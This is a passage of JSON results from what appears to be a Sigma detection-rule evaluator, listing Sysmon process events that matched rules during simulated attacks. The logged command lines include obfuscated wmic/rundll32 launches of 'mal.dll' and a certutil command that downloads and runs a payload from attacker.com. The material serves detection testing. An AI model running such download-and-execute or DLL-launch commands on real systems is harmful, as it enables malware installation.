      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_023.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E950-6A2E-EF14-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:48:00.228727Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:48:00.223",
      "Version": 5
    },
    {
      "row_id": 335,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer -\\\"s\\\" /N /u\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 211263,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_023.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer -\\\"s\\\" /N /u\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E950-6A2E-EF14-000000002C00",
      "ParentProcessId": 10628,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E950-6A2E-F014-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:48:00.250333Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:48:00.246",
      "Version": 5
    },
    {
      "row_id": 336,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /n /\\\"u\\\"\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 211308,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_024.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E966-6A2E-0615-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:48:22.374870Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:48:22.371",
      "Version": 5
    },
    {
      "row_id": 337,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /n /\\\"u\\\"\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 211309,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_024.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /n /\\\"u\\\"\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E966-6A2E-0615-000000002C00",
      "ParentProcessId": 10756,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E966-6A2E-0715-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:48:22.392413Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:48:22.389",
      "Version": 5
    },
    {
      "row_id": 338,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /n -\\\"u\\\"\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 211350,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_025.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E97C-6A2E-1C15-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:48:44.066238Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:48:44.055",
      "Version": 5
    },
    {
      "row_id": 339,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /n -\\\"u\\\"\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 211353,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_025.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /n -\\\"u\\\"\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E97C-6A2E-1C15-000000002C00",
      "ParentProcessId": 8560,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E97C-6A2E-1E15-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:48:44.118929Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:48:44.112",
      "Version": 5
    },
    {
      "row_id": 340,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /\\\"n\\\" /\\\"u\\\"\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 211394,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_026.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E98E-6A2E-3115-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:49:02.203885Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:49:02.199",
      "Version": 5
    },
    {
      "row_id": 341,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /\\\"n\\\" /\\\"u\\\"\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 211395,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_026.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /\\\"n\\\" /\\\"u\\\"\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E98E-6A2E-3115-000000002C00",
      "ParentProcessId": 11580,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E98E-6A2E-3215-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:49:02.229580Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:49:02.226",
      "Version": 5
    }
  ]
},
{
  "title": "Suspicious Download Via Certutil.EXE",
  "id": "19b08b1c-861d-4e75-a1ef-ea0c1baf202b",
  "description": "Detects the execution of certutil with certain flags that allow the utility to download files.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((Image LIKE '%\\\\certutil.exe' ESCAPE '\\' OR OriginalFileName='CertUtil.exe') AND (CommandLine LIKE '%urlcache %' ESCAPE '\\' OR CommandLine LIKE '%verifyctl %' ESCAPE '\\') AND CommandLine LIKE '%http%' ESCAPE '\\'))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.defense-evasion",
    "attack.t1027"
  ],
  "count": 2,
  "matches": [
    {
      "row_id": 243,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "certutil.exe  -urlcache -f http://attacker.com/payload.exe C:\\temp\\p.exe ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "CertUtil.exe",
      "EventID": 1,
      "EventRecordID": 209062,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=1501DDD5F587BA4B487BEBF67B8BCAB3,SHA256=DF1713860E3C1CD8CF9AE0D0A11DD1BE08095171617A7B9D02ABC755C22E489A,IMPHASH=242F130DCE7E979756BD6A1B445D7E28",
      "IMPHASH": "242F130DCE7E979756BD6A1B445D7E28",
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "1501DDD5F587BA4B487BEBF67B8BCAB3",
      "Opcode": 0,
      "OriginalFileName": "CertUtil.exe",
      "OriginalLogfile": "t1114__t1114_020.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c \"certutil.exe -urlcache -f http://attacker.com/payload.exe C:\\temp\\p.exe && C:\\temp\\p.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E52B-6A2E-A610-000000002C00",
      "ParentProcessId": 10416,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E52B-6A2E-A710-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "DF1713860E3C1CD8CF9AE0D0A11DD1BE08095171617A7B9D02ABC755C22E489A",
      "SystemTime": "2026-06-14T17:30:19.945536Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:30:19.886",
      "Version": 5
    },
    {
      "row_id": 293,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "certutil.exe  -urlcache -f http://attacker.com/payload.exe C:\\temp\\p.exe ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "CertUtil.exe",
      "EventID": 1,
      "EventRecordID": 210285,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=1501DDD5F587BA4B487BEBF67B8BCAB3,SHA256=DF1713860E3C1CD8CF9AE0D0A11DD1BE08095171617A7B9D02ABC755C22E489A,IMPHASH=242F130DCE7E979756BD6A1B445D7E28",
      "IMPHASH": "242F130DCE7E979756BD6A1B445D7E28",
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "1501DDD5F587BA4B487BEBF67B8BCAB3",
      "Opcode": 0,
      "OriginalFileName": "CertUtil.exe",
      "OriginalLogfile": "t1204.002__t1204.002_001.evtx",
      "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c \"certutil.exe -urlcache -f http://attacker.com/payload.exe C:\\temp\\p.exe && C:\\temp\\p.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E78C-6A2E-0713-000000002C00",
      "ParentProcessId": 6612,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E78C-6A2E-0813-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "DF1713860E3C1CD8CF9AE0D0A11DD1BE08095171617A7B9D02ABC755C22E489A",
      "SystemTime": "2026-06-14T17:40:28.796230Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:40:28.793",
      "Version": 5
    }
  ]
},
